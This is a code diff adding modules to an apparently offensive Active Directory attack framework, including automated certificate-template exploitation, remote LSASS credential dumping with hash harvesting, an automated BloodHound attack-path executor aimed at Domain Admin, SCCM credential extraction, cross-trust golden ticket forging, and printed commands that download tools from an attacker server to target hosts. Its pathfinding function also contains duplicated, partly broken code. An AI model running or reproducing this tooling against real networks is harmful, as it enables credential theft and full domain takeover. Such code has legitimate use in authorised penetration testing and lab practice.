+            log('Auto mode — find and exploit vulnerable templates','info')
+            run_cmd(['python3',t,'-u',auth,'-dc-ip',target.dc,'-auto'],
+                    label='ADCSKiller auto')
+        elif action == 'find':
+            run_cmd(['python3',t,'-u',auth,'-dc-ip',target.dc],
+                    label='ADCSKiller find')
+        elif action == 'exploit':
+            esc = self.ask('ESC number','1')
+            run_cmd(['python3',t,'-u',auth,'-dc-ip',target.dc,f'-esc{esc}'],
+                    label=f'ADCSKiller ESC{esc}')
+        hr()
+
+
+# =============================================================================
+# GROUPER2 — GPO misconfiguration finder
+# =============================================================================
+class Grouper2(Module):
+    name='grouper2'; description='Grouper2 — enumerate GPO misconfigurations, find privesc paths via Group Policy'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}Grouper2 — GPO misconfiguration analysis{RESET}','info')
+        log(f'{GREY}Finds weak GPO permissions, password in GPOs, script paths, etc.{RESET}','info')
+
+        # Grouper2 is a .NET tool — run via exec or upload
+        t = check_tool('Grouper2','Grouper2.exe')
+        if not t:
+            log(f'Grouper2.exe not found in win tools — checking local','warn')
+            t = os.path.join(os.path.expanduser('~/.segfault-ad/tools/win'),'Grouper2.exe')
+            if not os.path.exists(t):
+                log(f'Download from: https://github.com/l0ss/Grouper2/releases','error')
+                log(f'Place at: {WHITE}{t}{RESET}','info')
+                hr(); return
+
+        # needs to run on Windows via exec shell — generate command
+        log(f'Run on target Windows host via exec shell:','info')
+        print(f'  {C0}Invoke-WebRequest -Uri https://your-server/Grouper2.exe -OutFile C:\\Temp\\Grouper2.exe{RESET}')
+        print(f'  {C0}C:\\Temp\\Grouper2.exe -f C:\\Temp\\grouper2_out.json{RESET}')
+        print(f'  {C0}# or: Grouper2.exe -u (full output) -l 3 (verbosity){RESET}')
+        print()
+
+        # alternative: use netexec to run it remotely
+        nxc = check_tool('netexec','nxc')
+        if nxc and target.user and target.password:
+            ans = self.ask('run via netexec smb exec','y',['y','n'])
+            if ans == 'y':
+                out = os.path.join(target.loot_dir,'grouper2.txt')
+                run_cmd([nxc,'smb',target.dc,
+                         '-u',target.user,'-p',target.password,
+                         '-M','grouper2'],
+                        label='nxc grouper2 module')
+        hr()
+
+
+# =============================================================================
+# ACLIGHT — shadow admin / privileged account discovery
+# =============================================================================
+class ACLight(Module):
+    name='aclight'; description='ACLight — discover shadow admins and privileged accounts beyond default DA/EA via ACL analysis'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}ACLight — privileged account discovery{RESET}','info')
+        log(f'{GREY}Finds shadow admins — accounts with admin-equivalent rights not in DA/EA{RESET}','info')
+
+        t = check_tool('ACLight2.ps1','ACLight')
+        if not t:
+            win_dir = os.path.expanduser('~/.segfault-ad/tools/win')
+            t = os.path.join(win_dir,'ACLight2.ps1')
+            if not os.path.exists(t):
+                log(f'Download from: https://github.com/cyberark/ACLight','error')
+                log(f'Place ACLight2.ps1 at: {WHITE}{t}{RESET}','info')
+
+        # run via netexec or generate PS command
+        nxc = check_tool('netexec','nxc')
+        if nxc and target.user and (target.password or target.hash):
+            auth = ['-u',target.user]
+            if target.hash:     auth += ['-H',target.hash]
+            else:               auth += ['-p',target.password]
+            out = os.path.join(target.loot_dir,'aclight.txt')
+            log('Running ACLight via netexec...','info')
+            run_cmd([nxc,'smb',target.dc]+auth+[
+                '--exec-method','smbexec',
+                '-X','Import-Module ACLight2.ps1; Start-ACLsAnalysis'],
+                label='ACLight shadow admin scan')
+        else:
+            log('Run manually on Windows host:','info')
+            print(f'  {C0}Import-Module ACLight2.ps1{RESET}')
+            print(f'  {C0}Start-ACLsAnalysis{RESET}')
+            print(f'  {C0}# Results saved to PrivilegedAccountsResults.txt{RESET}')
+
+        # also use netexec LDAP to find accounts with adminCount=1 that aren't in admin groups
+        log('Checking adminCount=1 accounts via LDAP...','info')
+        if nxc and target.dc and target.user:
+            auth2 = ['-u',target.user]
+            if target.password: auth2 += ['-p',target.password]
+            elif target.hash:   auth2 += ['-H',target.hash]
+            rc, out_lines = run_cmd_capture(
+                [nxc,'ldap',target.dc]+auth2+[
+                    '--query','(&(adminCount=1)(objectClass=user))','name sAMAccountName memberOf'],
+                label='ldap adminCount=1')
+            out_data = '\n'.join(out_lines) if out_lines else ''
+            if out_data:
+                out_file = os.path.join(target.loot_dir,'shadow_admins.txt')
+                with open(out_file,'w') as f: f.write(out_data)
+                log(f'Saved → {WHITE}{out_file}{RESET}','info')
+                add_result('aclight','shadow admin scan complete')
+        hr()
+
+
+# =============================================================================
+# LSASSY — remote LSASS dump without mimikatz
+# =============================================================================
+class Lsassy(Module):
+    name='lsassy'; description='lsassy — remote LSASS dump and credential extraction without dropping mimikatz'; category='credentials'
+    def run(self, target):
+        if not self.req(target): return
+        t = self.need('lsassy')
+        if not t: return
+        hr()
+        log(f'{C0}lsassy — remote LSASS credential extraction{RESET}','info')
+
+        host = self.ask('target host',target.dc or '')
+        if not host: hr(); return
+
+        method = self.ask('dump method','comsvcs',
+            ['comsvcs','procdump','dumpert','mirrordump','rdrleakdiag','silentprocessexit'])
+
+        out = os.path.join(target.loot_dir,'lsassy.txt')
+        auth_args = ['-d',target.domain,'-u',target.user]
+        if target.hash:     auth_args += ['-H',target.hash]
+        elif target.password: auth_args += ['-p',target.password]
+
+        cmd = [t] + auth_args + ['-m',method,host]
+        rc, out_lines = run_cmd_capture(cmd, label=f'lsassy {method}')
+        out_data = '\n'.join(out_lines) if out_lines else ''
+
+        if out_data:
+            print(out_data)
+            # parse creds
+            import re as _re
+            creds = _re.findall(r'(\S+):(\S+):([a-f0-9]{32})', out_data)
+            if creds:
+                log(f'{GREEN}{len(creds)} credential(s) extracted{RESET}','success')
+                with open(out,'w') as f:
+                    for domain, user, ntlm in creds:
+                        f.write(f'{domain}\\{user}:{ntlm}\n')
+                        log(f'  {GREEN}{domain}\\{user}{RESET} → {WHITE}{ntlm}{RESET}','success')
+                        _db_save_cred(os.path.basename(target.loot_dir),
+                                      target.domain, user, None, hash=ntlm, source='lsassy')
+                add_result('lsassy', f'{len(creds)} creds extracted')
+                log(f'Saved → {WHITE}{out}{RESET}','info')
+            else:
+                log('No credentials parsed from output','warn')
+        hr()
+
+
 class Certipy(Module):
     name='certipy'; description='certipy -- ADCS ESC1-16 exploitation + find/auth/shadow/relay'; category='exploitation'
 
@@ -3611,6 +4273,9 @@ class Rubeus(Module):
 # PATHFINDER ENGINE
 # =============================================================================
 
+# pathpwn action hints — populated by PathPwn, read by bloody/dcsync modules
+_PATHPWN_HINTS: dict = {}
+
 ACE_TO_MODULE = {
     # ── Ownership / DACL ─────────────────────────────────────────────────────
     'GenericAll':              ('bloody',       'resetpwd',    'full control — reset pwd, add to group, shadow creds'),
@@ -3983,9 +4648,108 @@ def _build_graph(data):
 
     return adj, sn, st, hv, dom_sid
 
+def _edge_weight(right, src_type, dst_type):
+    """Edge weights based on autobloody's approach — lower = prefer this path.
+    Weights reflect exploitation difficulty and reliability."""
+    # DCSync-enabling edges on domain — best paths
+    if right in ('GetChangesAll',) and dst_type in ('Domain','domain'):
+        return 1
+    if right in ('WriteDacl','WriteOwner') and dst_type in ('Domain','domain'):
+        return 2
+    if right in ('GenericAll','Owns','AllExtendedRights') and dst_type in ('Domain','domain'):
+        return 3
+    # Group membership — free, just inherit rights
+    if right == 'MemberOf':
+        return 1
+    # Strong rights on groups
+    if right in ('AddMember','AddSelf') and dst_type in ('Group','group'):
+        return 2
+    if right in ('GenericAll','GenericWrite') and dst_type in ('Group','group'):
+        return 3
+    if right == 'WriteDacl' and dst_type in ('Group','group'):
+        return 3
+    # Rights on users
+    if right == 'ForceChangePassword':
+        return 4
+    if right in ('GenericAll','GenericWrite','WriteOwner') and dst_type in ('User','user'):
+        return 4
+    # Computer rights
+    if right in ('AdminTo','CanPSRemote','CanRDP') and dst_type in ('Computer','computer'):
+        return 5
+    if right in ('AllowedToAct','GenericAll') and dst_type in ('Computer','computer'):
+        return 5
+    # Partial DCSync — needs both GetChanges AND GetChangesAll, avoid unless combined
+    if right == 'GetChanges':
+        return 50
+    # Certificate / shadow creds paths
+    if right in ('AddKeyCredentialLink','ManageCA','ManageCertificates'):
+        return 6
+    # Fallback
+    return 10
+
+
+def _dijkstra_paths(starts, adj, hv, sn, st, max_depth=10):
+    """Dijkstra shortest path weighted by exploitation difficulty.
+    Returns list of paths sorted by total weight (best first)."""
+    import heapq as _hq
+
+    _COMPROMISE = {'GenericAll','AllExtendedRights','ForceChangePassword','Owns',
+                   'WriteDacl','WriteOwner','AddKeyCredentialLink','GenericWrite',
+                   'AdminTo','CanPSRemote','CanRDP','AllowedToAct','ManageCA',
+                   'ManageCertificates','SQLAdmin','AddMember','AddSelf',
+                   'WriteAccountRestrictions','GetChangesAll'}
+
+    # heap: (cost, path_as_list_of_(node,right,prev))
+    heap = []
+    for s in starts:
+        heapq.heappush(heap, (0, id([]), [(s, None, None)]))
+
+    visited = {}  # node → best cost seen
+    found   = []
+
+    import heapq
+    heap = []
+    for s in starts:
+        heapq.heappush(heap, (0, [(s, None, None)]))
+
+    visited = {}
+
+    while heap:
+        cost, path = heapq.heappop(heap)
+        cur = path[-1][0]
+
+        if len(path) > max_depth:
+            continue
+
+        if cur in visited and visited[cur] <= cost:
+            continue
+        visited[cur] = cost
+
+        if cur in hv:
+            found.append((cost, path))
+            continue
+
+        for right, nxt in adj.get(cur, []):
+            src_type = st.get(cur, '')
+            dst_type = st.get(nxt, '')
+            w = _edge_weight(right, src_type, dst_type)
+            new_cost = cost + w
+            new_path = path + [(nxt, right, cur)]
+
+            if nxt not in visited or visited[nxt] > new_cost:
+                heapq.heappush(heap, (new_cost, new_path))
+
+            # compromise expansion — if we can take over nxt, explore its edges too
+            if right in _COMPROMISE and nxt not in visited:
+                heapq.heappush(heap, (new_cost, new_path))
+
+    # sort by cost then length, return top paths
+    found.sort(key=lambda x: (x[0], len(x[1])))
+    return [path for cost, path in found[:10]]
+
+
 def _bfs_paths(starts, adj, hv, sn, max_depth=8):
-    """BFS with compromise expansion: GenericAll/ForceChangePassword on X means
-    you can act as X, so X's outbound edges become reachable."""
+    """BFS fallback — kept for compatibility. Prefer _dijkstra_paths."""
     from collections import deque as _dq
     _COMPROMISE = {'GenericAll','AllExtendedRights','ForceChangePassword','Owns','WriteDacl','WriteOwner','AddKeyCredentialLink','GenericWrite','AdminTo','CanPSRemote','CanRDP','AllowedToAct','ManageCA','ManageCertificates','SQLAdmin','AddMember','AddSelf','WriteAccountRestrictions'}
     visited = set(starts)
@@ -3999,18 +4763,15 @@ def _bfs_paths(starts, adj, hv, sn, max_depth=8):
         for right, nxt in adj[cur]:
             new_path = path + [(nxt, right, cur)]
             if nxt in hv:
-                if sn.get(nxt,'') == 'DOMAIN' and right not in _DCSYNC:
-                    pass
-                else:
-                    found.append(new_path)
+                found.append(new_path)
                 continue
             if nxt not in visited:
                 visited.add(nxt)
                 queue.append(new_path)
-                # if we can compromise nxt, also explore FROM nxt
                 if right in _COMPROMISE:
-                    queue.append(new_path)  # re-enqueue to explore nxt's edges
+                    queue.append(new_path)
     return sorted(found, key=len)
+
 
 def _fmt_steps(path, sn, st=None):
     """Format path steps. st = sid->type dict for smart action selection."""
@@ -4045,11 +4806,11 @@ class Pathfind(Module):
     def run(self, target):
         hr()
         log('Loading BloodHound data from loot/bloodhound/...', 'info')
-        data = _load_bh(target.loot_dir)
+        data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
         if not data['users']:
             log(f'No BloodHound JSON found — run {C0}adrecon{RESET} first', 'error'); hr(); return
         log(f'{WHITE}{len(data["users"])} users  {len(data["groups"])} groups  {len(data["computers"])} computers  {len(data.get("ous",[]))} OUs  {len(data.get("gpos",[]))} GPOs{RESET}', 'info')
-        adj, sn, st, hv, dom_sid = _build_graph(data)
+
 
         owned = self.ask('owned user', target.user or '')
         def _match_user(u, q):
@@ -4087,7 +4848,7 @@ class Pathfind(Module):
         for r, t in adj[owned_sid]:
             if r == 'MemberOf': starts.add(t)
 
-        paths = _bfs_paths(starts, adj, hv, sn)
+        paths = _dijkstra_paths(starts, adj, hv, sn, st)
 
         if not paths:
             log('No paths to high-value targets — showing direct outbound edges', 'warn')
@@ -4224,6 +4985,150 @@ class Pathfind(Module):
             go = self.ask('run it now?', 'n', ['y','n'])
             if go == 'y' and first['module'] in MODULES:
                 MODULES[first['module']]().run(target)
+        hr()
+
+
+# =============================================================================
+# PATHPWN — auto-execute BloodHound attack path
+# =============================================================================
+class PathPwn(Module):
+    name='pathpwn'; description='auto-execute BloodHound attack path — chains modules from pathfind output to DA'; category='exploitation'
+    def run(self, target):
+        hr()
+        log(f'{C0}{BOLD}PathPwn — automated ACL chain execution{RESET}','info')
+        log(f'{GREY}Reads BloodHound data, finds shortest path to DA, runs each step{RESET}','info')
+
+        data, adj, sn, st, hv, dom_sid = get_bh_data(target.loot_dir)
+        if not data['users']:
+            log(f'No BloodHound JSON found — run {C0}adrecon{RESET} first','error'); hr(); return
+
+
+
+        owned = self.ask('start user', target.user or '')
+        if not owned: hr(); return
+
+        def _match_user(u, q):
+            q = q.upper()
+            name = u['Properties'].get('name','').upper()
+            sam  = u['Properties'].get('samaccountname', u['Properties'].get('SamAccountName','')).upper()
+            return (name == q or name.split('@')[0] == q or sam == q or sam.split('@')[0] == q)
+
+        owned_sid = next((u['ObjectIdentifier'] for u in data['users'] if _match_user(u, owned)), None)
+        if not owned_sid:
+            log(f'User {WHITE}{owned}{RESET} not found in BloodHound data','error'); hr(); return
+
+        starts = {owned_sid}
+        for r, t in adj[owned_sid]:
+            if r == 'MemberOf': starts.add(t)
+
+        paths = _dijkstra_paths(starts, adj, hv, sn, st)
+        if not paths:
+            log('No paths to DA found — run pathfind to see available edges','warn'); hr(); return
+
+        # Dijkstra already returns paths sorted by weight (best first)
+        path = paths[0]
+        log(f'{GREEN}{len(paths)} path(s) found — shortest has {len(path)-1} steps{RESET}','success')
+        print()
+
+        # path format: [(sid, right, prev_sid), ...] where first entry has right=None
+        steps = []
+        for node, right, prev in path:
+            if right is None: continue  # skip start node
+            src_sid  = prev
+            dst_sid  = node
+            edge     = right
+            _sn_src  = sn.get(src_sid, src_sid)
+            _sn_dst  = sn.get(dst_sid, dst_sid)
+            src_name = (str(_sn_src[0]) if isinstance(_sn_src, tuple) else str(_sn_src)).split('@')[0]
+            dst_name = (str(_sn_dst[0]) if isinstance(_sn_dst, tuple) else str(_sn_dst)).split('@')[0]
+            mod, action, desc = ACE_TO_MODULE.get(str(edge), ('','',''))
+            steps.append({'edge':str(edge),'src':src_name,'dst':dst_name,
+                          'src_sid':src_sid,'dst_sid':dst_sid,
+                          'module':mod,'action':action,'desc':desc})
+
+        # show plan
+        print(f'  {C0}{BOLD}attack plan:{RESET}\n')
+        for idx, s in enumerate(steps):
+            col = RED    if s['edge'] in ('GenericAll','WriteDacl','WriteOwner','Owns') else \
+                  ORANGE if s['edge'] in ('ForceChangePassword','AddMember','AddSelf','GenericWrite','AllExtendedRights') else \
+                  PINK   if s['edge'] in ('GetChangesAll','GetChanges','DCSync') else \
+                  GREEN  if s['edge'] in ('AdminTo','CanPSRemote') else C0
+            mod_str = f'{C0}→ {s["module"]}{RESET}' if s['module'] else f'{GREY}manual{RESET}'
+            src = str(s["src"]); dst = str(s["dst"]); edge = str(s["edge"])
+            print(f'  {GREY}{idx+1:02d}{RESET}  {WHITE}{src:<20}{RESET} {col}{edge:<22}{RESET} {WHITE}{dst:<20}{RESET}  {mod_str}')
+        print()
+
+        confirm = self.ask(f'execute {len(steps)} steps','y',['y','n'])
+        if confirm != 'y': hr(); return
+
+        for idx, s in enumerate(steps):
+            hr()
+            log(f'{GREY}step {idx+1}/{len(steps)}{RESET}  {WHITE}{str(s["src"])}{RESET} {C0}─[{str(s["edge"])}]→{RESET} {WHITE}{str(s["dst"])}{RESET}','info')
+            if s['desc']: log(f'{GREY}{s["desc"]}{RESET}','info')
+
+            if s['edge'] == 'MemberOf':
+                log(f'{GREY}MemberOf — group membership already effective, skipping{RESET}','info')
+                continue
+
+            if not s['module']:
+                log(f'No automated module for {WHITE}{s["edge"]}{RESET} — manual action required','warn')
+                input(f'  Complete manually then press Enter to continue...')
+                continue
+
+            mod = MODULES.get(s['module'])
+            if not mod:
+                log(f'Module {s["module"]} not available','warn')
+                input(f'  Press Enter to continue...')
+                continue
+
+            try:
+                log(f'{PINK}→ running {s["module"]}{RESET}','info')
+
+                # ── smart pathpwn context injection ──────────────────────────
+                # store hints in a global that bloody/dcsync modules can read
+                edge     = s['edge']
+                dst      = s['dst']
+                src      = s['src']
+                _dst_up  = dst.upper()
+                _is_dom  = any(x in _dst_up for x in ('DOMAIN','HTB.LOCAL','LOCAL','DC='))
+                _is_grp  = not any(x in _dst_up for x in ('$',))
+                _usr     = target.user or src
+
+                if s['module'] == 'bloody':
+                    if edge == 'WriteDacl' and _is_dom:
+                        log(f'{C0}auto: WriteDacl on Domain → dcsync-rights{RESET}','info')
+                        _PATHPWN_HINTS['action'] = 'dcsync-rights'
+                    elif edge in ('GenericAll','WriteOwner','Owns') and _is_dom:
+                        log(f'{C0}auto: {edge} on Domain → dcsync-rights{RESET}','info')
+                        _PATHPWN_HINTS['action'] = 'dcsync-rights'
+                    elif edge in ('GenericAll','WriteDacl','AddMember','AddSelf') and _is_grp:
+                        log(f'{C0}auto: {edge} on group {dst} → addtogroup {_usr}{RESET}','info')
+                        _PATHPWN_HINTS['action'] = 'addtogroup'
+                        _PATHPWN_HINTS['group']  = dst
+                        _PATHPWN_HINTS['user']   = _usr
+                    elif edge == 'ForceChangePassword':
+                        log(f'{C0}auto: ForceChangePassword → resetpwd on {dst}{RESET}','info')
+                        _PATHPWN_HINTS['action'] = 'resetpwd'
+                        _PATHPWN_HINTS['user']   = dst
+                    else:
+                        log(f'{GREY}Target: {WHITE}{dst}{RESET}  Edge: {C0}{edge}{RESET}','info')
+                elif s['module'] == 'dcsync':
+                    log(f'{GREY}DCSync — dumping all domain hashes{RESET}','info')
+                    _PATHPWN_HINTS['user'] = ''  # dump all
+
+                mod().run(target)
+                _PATHPWN_HINTS.clear()
+                add_result('pathpwn', f'{s["edge"]}: {s["src"]} → {s["dst"]}')
+            except (EOFError, KeyboardInterrupt):
+                log('Step cancelled','warn')
+                if self.ask('continue to next step','y',['y','n']) != 'y': break
+            except Exception as exc:
+                log(f'Step error: {exc}','error')
+                if self.ask('continue anyway','y',['y','n']) != 'y': break
+
+        hr()
+        log(f'{GREEN}PathPwn complete{RESET}','success')
+        add_result('pathpwn', f'chain: {len(steps)} steps → DA')
         hr()
 
 
@@ -4886,6 +5791,390 @@ class DPAPI(Module):
 
 
 # =============================================================================
+# ACLSCAN — instant ACL vulnerability scan via abuseACL (no BloodHound needed)
+# =============================================================================
+class ACLScan(Module):
+    name='aclscan'; description='abuseACL — instant LDAP-based ACL scan, find exploitable ACEs for current user or any principal'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        t = self.need('abuseACL')
+        if not t: return
+        hr()
+        log(f'{C0}ACL Scanner — finds exploitable ACEs via direct LDAP{RESET}','info')
+        log(f'{GREY}Faster than BloodHound — no collection needed{RESET}','info')
+
+        mode = self.ask('mode','current',['current','principal','file','extends'])
+
+        auth_str = f'{target.domain}/{target.user}'
+        if target.password: auth_str += f':{target.password}'
+        auth_target = f'{auth_str}@{target.dc}'
+
+        out = os.path.join(target.loot_dir,'aclscan.txt')
+        hr()
+
+        if mode == 'current':
+            log(f'Scanning ACEs for {WHITE}{target.user}{RESET}...','info')
+            rc, out_lines = run_cmd_capture(
+                [t, auth_target],
+                label='abuseACL current user')
+            out_data = '\n'.join(out_lines) if out_lines else ''
+
+        elif mode == 'principal':
+            principal = self.ask('principal (user/group/computer)','')
+            if not principal: return
+            # abuseACL needs exact name — try with domain suffix if not present
+            if '@' not in principal and target.domain:
+                principal_full = f'{principal}@{target.domain.upper()}'
+            else:
+                principal_full = principal
+            log(f'Scanning ACEs for {WHITE}{principal_full}{RESET}...','info')
+            rc, out_lines = run_cmd_capture(
+                [t, '-principal', principal_full, auth_target],
+                label=f'abuseACL {principal_full}')
+            out_data = '\n'.join(out_lines) if out_lines else ''
+
+        elif mode == 'file':
+            pfile = self.ask('principals file path','')
+            if not pfile or not os.path.exists(pfile):
+                log('File not found','error'); return
+            log(f'Scanning ACEs for principals in {WHITE}{pfile}{RESET}...','info')
+            rc, out_lines = run_cmd_capture(
+                [t, '-principalsfile', pfile, auth_target],
+                label='abuseACL file')
+            out_data = '\n'.join(out_lines) if out_lines else ''
+
+        elif mode == 'extends':
+            log(f'Scanning Schema + adminSDHolder ACEs...','info')
+            rc, out_lines = run_cmd_capture(
+                [t, '-extends', auth_target],
+                label='abuseACL extends')
+            out_data = '\n'.join(out_lines) if out_lines else ''
+
+        # parse results (output already printed by run_cmd_capture)
+        dangerous = ['GenericAll','WriteDacl','WriteOwner','GenericWrite',
+                     'ForceChangePassword','AddMember','GetChangesAll','Owns']
+        hits = []
+        for line in out_data.splitlines():
+            for right in dangerous:
+                if right.lower() in line.lower():
+                    hits.append(line.strip())
+                    break
+
+        if hits:
+            log(f'{GREEN}{len(hits)} exploitable ACE(s) found{RESET}','success')
+            for h in hits:
+                print(f'  {RED}→{RESET} {h}')
+            add_result('aclscan', f'{len(hits)} exploitable ACEs')
+            with open(out,'w') as f:
+                f.write('\n'.join(hits))
+            log(f'Saved → {WHITE}{out}{RESET}','info')
+            log(f'Exploit with: {C0}bloody{RESET} or {C0}pathpwn{RESET}','info')
+        else:
+            log('No immediately exploitable ACEs found','warn')
+        hr()
+
+
+# =============================================================================
+# SCCM/MECM — discover, enumerate and extract NAA credentials
+# =============================================================================
+class SCCM(Module):
+    name='sccm'; description='SCCM/MECM — discover servers, extract NAA credentials via WMI/DPAPI, PXE abuse'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}SCCM/MECM Attack Surface{RESET}','info')
+        action = self.ask('action','enum',['enum','naa','dpapi','pxe','admin'])
+        hr()
+
+        if action == 'enum':
+            # discover SCCM servers via AD
+            t = self.need('sccmhunter','sccmhunter.py')
+            if not t:
+                log(f'{GREY}sccmhunter not found — trying netexec SCCM enum{RESET}','info')
+                nxc = check_tool('netexec','nxc')
+                if nxc and target.dc:
+                    run_cmd([nxc,'ldap',target.dc,'-u',target.user or '',
+                             '-p',target.password or '',
+                             '--query','(objectClass=mSSMSSite)',''],
+                            label='ldap SCCM sites')
+                    run_cmd([nxc,'ldap',target.dc,'-u',target.user or '',
+                             '-p',target.password or '',
+                             '--query','(objectClass=mSSMSManagementPoint)',''],
+                            label='ldap management points')
+                return
+            auth = _build_auth_args(target)
+            run_cmd([t,'find'] + auth + ['-d',target.domain,'-dc-ip',target.dc],
+                    label='sccmhunter find')
+
+        elif action == 'naa':
+            # extract NAA credentials via WMI
+            t = self.need('sccmhunter','sccmhunter.py')
+            sccm_target = self.ask('SCCM server/client IP','')
+            if not t or not sccm_target: return
+            auth = _build_auth_args(target)
+            run_cmd([t,'dpapi'] + auth + [
+                '-d',target.domain,'-dc-ip',target.dc,
+                '-target',sccm_target,'-wmi'],
+                label='sccmhunter NAA extract (WMI)')
+
+        elif action == 'dpapi':
+            # extract via DPAPI (requires local admin on SCCM client)
+            t = check_tool('SystemDPAPIdump.py','SystemDPAPIdump')
+            sccm_target = self.ask('SCCM client IP','')
+            if not sccm_target: return
+            auth_str = f'{target.domain}/{target.user}:{target.password}'
+            if target.hash:
+                auth_str = f'{target.domain}/{target.user}'
+                run_cmd(['python3',t or 'SystemDPAPIdump.py',
+                         '-creds','-sccm',
+                         f'{auth_str}:{target.hash}@{sccm_target}'],
+                        label='SystemDPAPIdump SCCM DPAPI')
+            else:
+                run_cmd(['python3',t or 'SystemDPAPIdump.py',
+                         '-creds','-sccm',
+                         f'{auth_str}@{sccm_target}'],
+                        label='SystemDPAPIdump SCCM DPAPI')
+
+        elif action == 'pxe':
+            # PXE boot variable extraction
+            t = self.need('pxethiefy','pxethiefy.py')
+            mp = self.ask('Management Point IP/hostname','')
+            if not t or not mp: return
+            out = os.path.join(target.loot_dir,'pxe_vars.bin')
+            run_cmd(['python3',t,mp,'-o',out], label='pxethiefy PXE extract')
+            log(f'If successful, crack with hashcat: {C0}hashcat -m 19850 {out} rockyou.txt{RESET}','info')
+
+        elif action == 'admin':
+            # gain SCCM admin via relay or existing DA
+            t = self.need('sccmhunter','sccmhunter.py')
+            sccm_target = self.ask('SCCM server IP','')
+            if not t or not sccm_target: return
+            auth = _build_auth_args(target)
+            run_cmd([t,'admin'] + auth + [
+                '-d',target.domain,'-dc-ip',target.dc,
+                '-target',sccm_target],
+                label='sccmhunter admin shell')
+        hr()
+
+
+# =============================================================================
+# TRUSTS — enumerate and abuse AD trust relationships
+# =============================================================================
+class Trusts(Module):
+    name='trusts'; description='AD trusts — enumerate trust relationships, SID history abuse, cross-forest attacks'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}AD Trust Enumeration & Abuse{RESET}','info')
+        action = self.ask('action','enum',['enum','sidhistory','golden','crossforest'])
+        hr()
+
+        if action == 'enum':
+            # enumerate all trusts
+            log('Enumerating domain trusts...','info')
+            # via netexec
+            nxc = check_tool('netexec','nxc')
+            if nxc:
+                run_cmd([nxc,'ldap',target.dc,
+                         '-u',target.user or '','-p',target.password or '',
+                         '--trusted-for-delegation'],
+                        label='nxc trusted for delegation')
+            # via impacket
+            get_user_spns = check_tool('impacket-GetUserSPNs','GetUserSPNs.py')
+            # via rpcclient
+            rpc = check_tool('rpcclient')
+            if rpc:
+                auth = f'{target.user}%{target.password}' if target.password else '%'
+                run_cmd([rpc,'-U',auth,f'//{target.dc}','-c','enumtrusts'],
+                        label='rpcclient enumtrusts')
+            # via PowerView equivalent — netexec
+            if nxc:
+                run_cmd([nxc,'ldap',target.dc,
+                         '-u',target.user or '','-p',target.password or '',
+                         '--query','(objectClass=trustedDomain)',
+                         'name trustDirection trustType trustAttributes'],
+                        label='ldap trust objects')
+            # save output
+            out = os.path.join(target.loot_dir,'trusts.txt')
+            log(f'Trust data → {WHITE}{out}{RESET}','info')
+            add_result('trusts','trust enumeration complete')
+
+        elif action == 'sidhistory':
+            # find users with SID history (potential cross-domain abuse)
+            log('Searching for SID history abuse vectors...','info')
+            nxc = check_tool('netexec','nxc')
+            if nxc:
+                run_cmd([nxc,'ldap',target.dc,
+                         '-u',target.user or '','-p',target.password or '',
+                         '--query','(sIDHistory=*)','name sIDHistory'],
+                        label='ldap SID history search')
+            # also check via bloodyAD
+            bloody = check_tool('bloodyad','bloodyAD')
+            if bloody:
+                run_cmd([bloody,'--host',target.fqdn or target.dc,
+                         '--dc-ip',target.dc,'-d',target.domain,
+                         '-u',target.user or '','-p',target.password or '',
+                         'get','object','*','--attr','sIDHistory'],
+                        label='bloodyAD SID history')
+
+        elif action == 'golden':
+            # cross-trust golden ticket / extra SID injection
+            log(f'{ORANGE}Cross-trust golden ticket — needs krbtgt hash of trusting domain{RESET}','info')
+            target_domain = self.ask('target (trusted) domain','')
+            extra_sid     = self.ask('extra SID (e.g. S-1-5-21-TRUSTED-DOMAIN-519)','')
+            krbtgt_hash   = self.ask('krbtgt NTLM hash of current domain','')
+            user          = self.ask('user to impersonate','Administrator')
+            domain_sid    = self.ask('current domain SID (S-1-5-21-...)','')
+            if not all([target_domain, extra_sid, krbtgt_hash, domain_sid]): return
+            ticketer = check_tool('impacket-ticketer','ticketer.py')
+            if not ticketer: return
+            out = os.path.join(target.loot_dir,f'golden_{target_domain}.ccache')
+            run_cmd([ticketer,
+                     '-nthash',krbtgt_hash,
+                     '-domain-sid',domain_sid,
+                     '-domain',target.domain,
+                     '-extra-sid',extra_sid,
+                     '-spn',f'krbtgt/{target_domain}',
+                     user,'-outfile',out],
+                    label='golden ticket cross-trust')
+            log(f'Use: {C0}export KRB5CCNAME={out}{RESET}','info')
+            log(f'Then: {C0}impacket-psexec -k -no-pass {target_domain}/Administrator@TARGET{RESET}','info')
+
+        elif action == 'crossforest':
+            # cross-forest enumeration with current creds
+            ext_domain = self.ask('external/trusted domain','')
+            ext_dc     = self.ask('external DC IP','')
+            if not ext_domain or not ext_dc: return
+            log(f'Enumerating {WHITE}{ext_domain}{RESET} via trust...','info')
+            nxc = check_tool('netexec','nxc')
+            if nxc:
+                run_cmd([nxc,'ldap',ext_dc,
+                         '-u',f'{target.domain}\\{target.user}',
+                         '-p',target.password or '',
+                         '--users'],
+                        label=f'cross-forest user enum → {ext_domain}')
+                run_cmd([nxc,'ldap',ext_dc,
+                         '-u',f'{target.domain}\\{target.user}',
+                         '-p',target.password or '',
+                         '--groups'],
+                        label=f'cross-forest group enum → {ext_domain}')
+            add_result('trusts',f'cross-forest enum: {ext_domain}')
+        hr()
+
+
+# =============================================================================
+# SNAFFLER — sensitive file finder on shares
+# =============================================================================
+class Snaffler(Module):
+    name='snaffler'; description='Snaffler — find sensitive files on network shares (passwords, keys, configs, secrets)'; category='recon'
+    def run(self, target):
+        if not self.req(target): return
+        hr()
+        log(f'{C0}Snaffler — sensitive file discovery{RESET}','info')
+        log(f'{GREY}Finds passwords, keys, configs, scripts across all accessible shares{RESET}','info')
+
+        t = check_tool('Snaffler','Snaffler.exe')
+        win_t = os.path.join(os.path.expanduser('~/.segfault-ad/tools/win'),'Snaffler.exe')
+
+        # check if we have a shell to run on target
+        mode = self.ask('mode','local',['local','remote'])
+
+        if mode == 'remote':
+            log(f'Run via exec shell on target:','info')
+            print(f'  {C0}upload ~/.segfault-ad/tools/win/Snaffler.exe{RESET}')
